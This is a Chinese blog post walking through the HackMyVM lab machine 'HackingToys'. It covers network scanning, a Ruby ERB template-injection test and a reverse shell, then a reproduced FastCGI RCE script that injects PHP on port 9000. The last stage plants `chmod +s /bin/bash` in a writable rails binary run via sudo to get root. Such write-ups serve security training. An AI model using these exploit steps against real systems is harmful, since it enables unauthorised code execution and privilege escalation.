<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm-HackingToys | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集主机发现 123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor file i">
<meta property="og:type" content="article">
<meta property="og:title" content="hackmyvm-HackingToys">
<meta property="og:url" content="http://example.com/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/index.html">
<meta property="og:site_name" content="Yliken">
<meta property="og:description" content="信息收集主机发现 123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor file i">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/essayhead/92.png">
<meta property="article:published_time" content="2025-03-14T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-16T14:20:58.000Z">
<meta property="article:author" content="Yliken">
<meta property="article:tag" content="hackmyvm">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/essayhead/92.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "hackmyvm-HackingToys",
  "url": "http://example.com/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/",
  "image": "http://example.com/img/essayhead/92.png",
  "datePublished": "2025-03-14T16:00:00.000Z",
  "dateModified": "2025-03-16T14:20:58.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Yliken",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://example.com/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 24 || hour >= 0
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hackmyvm-HackingToys',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/wenzhang.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/essayhead/92.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/essayhead/second.jpg" alt="Logo"><span class="site-name">Yliken</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm-HackingToys</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm-HackingToys</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-14T16:00:00.000Z" title="发表于 2025-03-15 00:00:00">2025-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-16T14:20:58.000Z" title="更新于 2025-03-16 22:20:58">2025-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Linux%E9%9D%B6%E6%9C%BA/">Linux靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:92:d2:b1       (Unknown)</span><br><span class="line">192.168.56.113  08:00:27:8a:19:e5       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>



<p>端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sC -sV 192.168.56.113</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 02:37 EDT</span><br><span class="line">Nmap scan report for 192.168.56.113</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)</span><br><span class="line">|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)</span><br><span class="line">3000/tcp open  ssl/ppp?</span><br><span class="line">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR</span><br><span class="line">| Not valid before: 2024-05-20T15:36:20</span><br><span class="line">|_Not valid after:  2038-01-27T15:36:20</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Content-Length: 930</span><br><span class="line">|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying t</span><br></pre></td></tr></table></figure>

<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151500974.png" alt="image-20250315150034833"></p>
<p>3000端口开了一个web服务</p>
<p>不过用的是https 协议 证书还过期了</p>
<p>我扫目录的时候不清楚应该怎么让工具忽略掉这个问题</p>
<p>导致目录扫描工具运行的特别慢</p>
<p>我就放弃了目录扫描这个过程</p>
<p>最开始我在这个参数的位置 尝试进行注入 但是没有任何结果</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151502837.png" alt="image-20250315150241801"></p>
<p>这个页面的web框架是<code>Ruby on Rails</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151504655.png" alt="image-20250315150439606"></p>
<p>我去搜索了一些<code>Ruby on Rails</code>的CVE，但是都无法利用</p>
<p>有一个CVE说这个<code>Ruby on Rails</code> 框架存在<code>XSS</code>漏洞</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151508882.png" alt="image-20250315150811777"></p>
<p>对他确实 存在 ，但是这有什么用呢？</p>
<p>这个<code>message</code>会将参数名显示在页面上</p>
<p>试一下ssti  <code>&lt;%= 7 * 7 %&gt;</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151509574.png" alt="image-20250315150958527"></p>
<p>ssti起作用了</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151510189.png" alt="image-20250315151050082"></p>
<p>反弹一个shell </p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151511649.png" alt="image-20250315151131597"></p>
<p>我在lidia用户目录下写一个ssh公钥，然后使用ssh登陆到机器上面</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151514681.png" alt="image-20250315151412519"></p>
<p>我上传上去一个<code>linpeas.sh</code>发现了<code>lidia</code>用户对<code>/usr/local/rvm/rubies/ruby-3.1.0/bin</code>有着写权限， 不过我暂时还不知道这有什么用(这个到后面会用到)</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151517433.png" alt="image-20250315151713353"></p>
<p>使用<code>ss -tlunp</code>发现在<code>127.0.0.1</code>这个地址上面的 80端口 和9000端口上面开了一些服务</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151519875.png" alt="image-20250315151905722"></p>
<p>80端口是一个http服务</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151521233.png" alt="image-20250315152120124"></p>
<p>后来我使用<code>ssh -L</code>将80端口的流量转发了出来。但是80端口只是一个静态文件。</p>
<p>使用<code>ps aux</code></p>
<p>发现运行了 <code>php-fpm</code>那么9000端口</p>
<p>上面可能就行fastcgi了</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151524049.png" alt="image-20250315152453978"></p>
<p>网站的根目录</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151525701.png" alt="image-20250315152525611"></p>
<p>这里用到了<a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html">9000-pentesting-fastcgi</a>的RCE EXP</p>
<p>但是要将脚本里面的网站根目录的路径修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">PAYLOAD=&quot;&lt;?php echo &#x27;&lt;!--&#x27;; system(&#x27;whoami&#x27;); echo &#x27;--&gt;&#x27;;&quot;</span><br><span class="line">FILENAMES=&quot;/var/www/html/index.php&quot; # Exisiting file path</span><br><span class="line"></span><br><span class="line">HOST=$1</span><br><span class="line">B64=$(echo &quot;$PAYLOAD&quot;|base64)</span><br><span class="line"></span><br><span class="line">for FN in $FILENAMES; do</span><br><span class="line">    OUTPUT=$(mktemp)</span><br><span class="line">    env -i \</span><br><span class="line">      PHP_VALUE=&quot;allow_url_include=1&quot;$&#x27;\n&#x27;&quot;allow_url_fopen=1&quot;$&#x27;\n&#x27;&quot;auto_prepend_file=&#x27;data://text/plain\;base64,$B64&#x27;&quot; \</span><br><span class="line">      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \</span><br><span class="line">      cgi-fcgi -bind -connect $HOST:9000 &amp;&gt; $OUTPUT</span><br><span class="line"></span><br><span class="line">    cat $OUTPUT</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151527367.png" alt="image-20250315152746254"></p>
<p>这里继续反弹shell -&gt; 写ssh公钥</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503151532689.png" alt="image-20250315153209473"></p>
<p><code>dodi</code>可以以root身份执行<code>/usr/local/bin/rvm_rails.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dodi@hacktoys:~$ cat /usr/local/bin/rvm_rails.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export rvm_prefix=/usr/local</span><br><span class="line">export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0</span><br><span class="line">export RUBY_VERSION=ruby-3.1.0</span><br><span class="line">export rvm_version=1.29.12</span><br><span class="line">export rvm_bin_path=/usr/local/rvm/bin</span><br><span class="line">export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global</span><br><span class="line">export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0</span><br><span class="line">export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin</span><br><span class="line">export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc</span><br><span class="line">export rvm_path=/usr/local/rvm</span><br><span class="line">exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails &quot;$@&quot;</span><br></pre></td></tr></table></figure>

<p>而<code>rvm_rails.sh</code>在最后会运行<code>/usr/local/rvm/gems/ruby-3.1.0/bin/rails </code></p>
<p>恰好<code>lidia</code>用户对这个文件有写入权限, 在这个文件中写入<code>chmod +s /bin/bash</code> 然后将这个命令用反引号包裹起来</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">lidia@hacktoys:~$ cat /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env ruby_executable_hooks</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This file was generated by RubyGems.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The application &#x27;railties&#x27; is installed as part of a gem, and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">this file is here to facilitate running it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">`<span class="built_in">chmod</span> +s /bin/bash`</span></span><br><span class="line">require &#x27;rubygems&#x27;</span><br><span class="line"></span><br><span class="line">Gem.use_gemdeps</span><br><span class="line"></span><br><span class="line">version = &quot;&gt;= 0.a&quot;</span><br><span class="line"></span><br><span class="line">str = ARGV.first</span><br><span class="line">if str</span><br><span class="line">  str = str.b[/\A_(.*)_\z/, 1]</span><br><span class="line">  if str and Gem::Version.correct?(str)</span><br><span class="line">    version = str</span><br><span class="line">    ARGV.shift</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">if Gem.respond_to?(:activate_bin_path)</span><br><span class="line">load Gem.activate_bin_path(&#x27;railties&#x27;, &#x27;rails&#x27;, version)</span><br><span class="line">else</span><br><span class="line">gem &quot;railties&quot;, version</span><br><span class="line">load Gem.bin_path(&quot;railties&quot;, &quot;rails&quot;, version)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>然后运行<code>sudo /usr/local/bin/rvm_rails.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dodi@hacktoys:~$ sudo /usr/local/bin/rvm_rails.sh</span><br><span class="line">Usage:</span><br><span class="line">  rails COMMAND [options]</span><br><span class="line"></span><br><span class="line">You must specify a command:</span><br><span class="line"></span><br><span class="line">  new          Create a new Rails application. &quot;rails new my_app&quot; creates a</span><br><span class="line">               new application called MyApp in &quot;./my_app&quot;</span><br><span class="line">  plugin new   Create a new Rails railtie or engine</span><br><span class="line"></span><br><span class="line">All commands can be run with -h (or --help) for more information.</span><br><span class="line"></span><br><span class="line">Inside a Rails application directory, some common commands are:</span><br><span class="line"></span><br><span class="line">  console      Start the Rails console</span><br><span class="line">  server       Start the Rails server</span><br><span class="line">  test         Run tests except system tests</span><br><span class="line">dodi@hacktoys:~$ ls -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash</span><br><span class="line">dodi@hacktoys:~$ bash -p</span><br><span class="line">bash-5.2# whoami</span><br><span class="line">root</span><br><span class="line">bash-5.2#</span><br></pre></td></tr></table></figure>

<p>然后<code>/bin/bash</code>就被加上了s权限。</p>
<p>就可以使用bash -p 提权到root了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/">http://example.com/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackmyvm/">hackmyvm</a></div><div class="post-share"><div class="social-share" data-image="/img/essayhead/92.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/07/%E4%BA%91/CICD/" title="CICD"><img class="cover" src="/img/essayhead/5.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CICD</div></div><div class="info-2"><div class="info-item-1">CI&#x2F;CDCI: 即 持续集成 ，是代码开发人员在将代码提交到代码存储库中。自动进行频繁的自动构建和测试阶段，频繁的将开发者的代码合并到主干，减少代码的质量问题:smile: 在多人协作的项目中，各开发人员负责各自的开发模块。每当完成一项需求后，开发人员需将代码提交至代码仓库。若每次提交后都人工进行构建和测试，工作量繁重且效率低下。而若等到一段时间后再统一测试，一旦发现问题，由于距离编写代码已过去一段时间，开发人员可能遗忘细节，导致修复困难重重。:face_with_head_bandage:为此，引入 Jenkins 等工具，在每次代码提交后自动执行构建和测试。若测试通过，代码自动合并至主分支；若不通过，则立即通知开发者修复。这种方式显著提升了开发效率，降低了问题排查和修复的成本。  关键组件  版本控制系统（VCS） 如 Git、SVN 等，用于管理代码的版本和多人协作，确保代码提交的追踪和管理。  构建工具 如 Maven、Gradle、Ant 